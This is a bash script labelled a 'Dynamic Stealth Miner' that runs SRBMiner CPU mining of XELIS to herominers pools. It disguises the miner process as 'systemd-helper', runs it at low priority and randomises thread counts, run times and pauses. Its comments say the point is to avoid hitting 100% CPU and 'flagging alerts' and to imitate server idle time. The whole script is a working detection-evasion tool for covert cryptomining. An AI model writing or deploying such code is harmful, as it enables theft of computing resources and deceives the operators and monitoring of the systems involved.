#!/bin/bash

# =========================================================================
# 1. Configuration (Dynamic Input)
# =========================================================================
echo "--- XELIS Dynamic Stealth Miner ---"

read -p "Enter Pool [stratum+tcp://sg.xelis.herominers.com:1225]: " POOLS
POOLS=${POOLS:-"stratum+tcp://sg.xelis.herominers.com:1225!stratum+tcp://de.xelis.herominers.com:1225"}

read -p "Enter Wallet: " WALLET
WALLET=${WALLET:-"xel:lm2rw5nq2k8wpqxd8p9r2k5p78klx57klttz8yklerckt8s8zpvqq9fpqww"}

read -p "Enter Worker Name [ethan_vps]: " WORKER
WORKER=${WORKER:-"ethan_vps"}

# Total CPU cores available (Your Xeon has 48)
TOTAL_CORES=48
# Mask name
PROG_NAME="systemd-helper"

# =========================================================================
# 2. Setup
# =========================================================================
MINER_EXEC=$(find ~ -type f -name "SRBMiner-MULTI" -executable -print -quit 2>/dev/null)
if [ -z "$MINER_EXEC" ]; then echo "Miner not found!"; exit 1; fi

ln -sf "$MINER_EXEC" "./$PROG_NAME"

# =========================================================================
# 3. Fluctuating Loop
# =========================================================================
while true; do
    # 1. Randomize Threads: Pick a number between 24 and 44 (50% to 90% load)
    # This keeps you from ever hitting 100% and flagging alerts.
    THREADS=$(( ( RANDOM % 20 )  + 24 ))
    
    # 2. Randomize Duration: Run this "cycle" for 15 to 45 minutes
    RUN_TIME=$(( ( RANDOM % 30 )  + 15 ))

    echo "[$(date +'%H:%M:%S')] Cycle start: $THREADS threads for $RUN_TIME minutes."

    # Start the miner in the background
    nice -n 19 ./"$PROG_NAME" --algorithm xelishashv3 \
    --pool "$POOLS" --wallet "$WALLET" --worker "$WORKER" \
    --disable-gpu --cpu-threads $THREADS --miner-priority 1 --syslog &
    
    MINER_PID=$!
    
    # Wait for the cycle duration
    sleep "${RUN_TIME}m"
    
    # 3. Randomize "Rest": Kill miner and rest for 1-5 minutes
    # This creates a "dip" in the graph, imitating a server downtime or idle state.
    echo "[$(date +'%H:%M:%S')] Cycle end. Resting..."
    kill $MINER_PID
    sleep $(( ( RANDOM % 5 ) + 1 ))m
done